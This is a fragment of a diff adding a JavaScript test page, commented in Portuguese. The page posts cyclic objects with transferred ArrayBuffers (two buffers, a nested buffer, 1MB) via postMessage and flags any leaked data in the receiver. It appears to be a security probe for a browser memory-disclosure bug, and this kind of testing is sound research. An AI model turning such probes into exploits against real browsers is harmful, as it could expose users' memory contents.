+        alerta('LEAK em ' + r.id + ': ' + r.leaked.join(', '));
+      } else {
+        ok(r.id + ': nenhum dado recebido (buffers zerados no receptor)');
+      }
+    });
+    window.onmessage = prevMsg2;
+  }
+
+  // Teste 1: dois buffers no mesmo objeto cíclico
+  pending++;
+  var buf1a = new ArrayBuffer(128); new Uint32Array(buf1a)[0] = 0xAABBCCDD;
+  var buf1b = new ArrayBuffer(512); new Uint32Array(buf1b)[0] = 0x11223344;
+  var cyc1 = { test_id: 'two_bufs', buf1: buf1a, buf2: buf1b, self: null };
+  cyc1.self = cyc1;
+  try { postMessage(cyc1, '*', [buf1a, buf1b]); } catch(e) { pending--; info('Teste 1 lançou: '+e.message); }
+  info('Teste 1 (dois buffers): buf1a.byteLength=' + buf1a.byteLength + ' buf1b.byteLength=' + buf1b.byteLength);
+
+  // Teste 2: buffer em nó ANINHADO do ciclo (não no nó raiz)
+  pending++;
+  var buf2 = new ArrayBuffer(64); new Uint32Array(buf2)[0] = 0xDEEDBEEF;
+  var nested = { buf: buf2, parent: null };
+  var cyc2 = { test_id: 'nested_buf', buf1: null, buf2: null, nested: nested, self: null };
+  cyc2.self = cyc2;
+  nested.parent = cyc2; // nested também é parte do ciclo
+  try { postMessage(cyc2, '*', [buf2]); } catch(e) { pending--; info('Teste 2 lançou: '+e.message); }
+  info('Teste 2 (nested buf): buf2.byteLength=' + buf2.byteLength);
+
+  // Teste 3: buffer grande (1MB)
+  pending++;
+  var bigBuf = new ArrayBuffer(1024*1024); // 1MB
+  var bigView = new Uint32Array(bigBuf);
+  bigView[0] = 0xBEEFCAFE;
+  bigView[bigView.length-1] = 0xFACEFACE;
+  var cyc3 = { test_id: 'big_1mb', buf1: bigBuf, buf2: null, self: null };
+  cyc3.self = cyc3;
+  try { postMessage(cyc3, '*', [bigBuf]); } catch(e) { pending--; info('Teste 3 lançou: '+e.message); }
+  info('Teste 3 (1MB): bigBuf.byteLength=' + bigBuf.byteLength);
+
+  info('\nAguardando resultados dos 3 testes...');
 }
 </script>
 </body>
